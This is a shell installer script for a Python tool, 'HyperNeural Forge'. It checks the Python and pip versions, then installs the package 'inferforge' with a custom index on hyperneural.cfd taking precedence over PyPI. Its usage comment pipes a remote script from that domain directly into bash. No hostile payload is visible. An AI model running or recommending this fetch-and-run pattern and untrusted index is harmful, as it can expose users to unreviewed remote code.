#!/bin/bash
# HyperNeural Forge Installer for macOS/Linux
# Usage: curl -fsSL https://hyperneural.cfd/install.sh | bash

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║           HyperNeural Forge Installer v0.2.0              ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Check for Python
PYTHON_CMD=""
if command -v python3 &>/dev/null; then
    PYTHON_CMD="python3"
elif command -v python &>/dev/null; then
    PYTHON_CMD="python"
else
    echo -e "${RED}✗ Python 3.10+ is required but not found.${NC}"
    echo "Please install Python 3.10+ from https://python.org"
    exit 1
fi

# Check Python version
PYTHON_VERSION=$($PYTHON_CMD -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
PYTHON_MAJOR=$(echo $PYTHON_VERSION | cut -d. -f1)
PYTHON_MINOR=$(echo $PYTHON_VERSION | cut -d. -f2)

if [ "$PYTHON_MAJOR" -lt 3 ] || ([ "$PYTHON_MAJOR" -eq 3 ] && [ "$PYTHON_MINOR" -lt 10 ]); then
    echo -e "${RED}✗ Python 3.10+ required. Found: $PYTHON_VERSION${NC}"
    exit 1
fi

echo -e "${GREEN}✓${NC} Python $PYTHON_VERSION detected"

# Check for pip
if ! command -v pip3 &>/dev/null && ! command -v pip &>/dev/null; then
    echo -e "${YELLOW}⚠${NC} pip not found. Installing pip..."
    $PYTHON_CMD -m ensurepip --upgrade
fi

PIP_CMD="pip3"
if ! command -v pip3 &>/dev/null; then
    PIP_CMD="pip"
fi

# Upgrade pip
echo -e "${BLUE}→${NC} Upgrading pip..."
$PYTHON_CMD -m pip install --upgrade pip --quiet

# Install Forge with custom index
echo -e "${BLUE}→${NC} Installing HyperNeural Forge with custom index..."
if $PIP_CMD install inferforge --index-url https://hyperneural.cfd/pypi/simple/ --extra-index-url https://pypi.org/simple; then
    echo ""
    echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}  ✓ HyperNeural Forge installed successfully!${NC}"
    echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "Run ${BLUE}forge --help${NC} to get started"
    echo -e "Run ${BLUE}forge connect${NC} to link your account"
    echo ""
else
    echo -e "${RED}✗ Installation failed. Please check the error above.${NC}"
    echo "You can also try: pip install git+https://github.com/silentalex1/HyperNeural.git"
    exit 1
fi